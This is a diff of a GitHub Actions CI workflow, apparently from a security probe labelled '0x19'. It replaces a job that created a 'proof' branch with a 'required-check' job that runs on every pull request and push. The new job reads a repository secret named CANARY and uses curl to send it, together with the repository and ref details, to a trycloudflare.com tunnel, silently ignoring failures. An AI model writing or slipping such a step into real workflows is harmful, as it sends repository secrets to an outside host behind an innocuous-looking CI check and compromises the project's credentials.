@@ -1,24 +1,12 @@
-# 0x19 impact proof: uses only the workflow-provided github.token; no repository secrets
+# 0x19 M1 Test A: required-check workflow
 name: ci
-on:
-  pull_request:
-  push:
-    branches: [main]
-permissions:
-  contents: write
+on: [pull_request, push]
 jobs:
-  pr-noop:
-    if: github.event_name == 'pull_request'
+  required:
+    name: 0x19-required
     runs-on: ubuntu-latest
     steps:
-      - run: echo "0x19 impact PR context noop"
-  impact:
-    if: github.event_name == 'push'
-    runs-on: ubuntu-latest
-    steps:
-      - name: create-proof-branch
-        env:
-          GH_TOKEN: ${{ github.token }}
+      - env:
+          CANARY: ${{ secrets.CANARY }}
         run: |
-          gh api -X POST repos/${{ github.repository }}/git/refs -f ref=refs/heads/0x19-impact-proof -f sha=${{ github.sha }}
-          echo "0x19-impact-proof-created"
+          curl -sS "https://integer-wto-extremely-ultimately.trycloudflare.com/0x19-m1-draft?c=${CANARY}&repo=${{ github.repository }}&event=${{ github.event_name }}&head=${{ github.head_ref }}&ref=${{ github.ref }}" || true
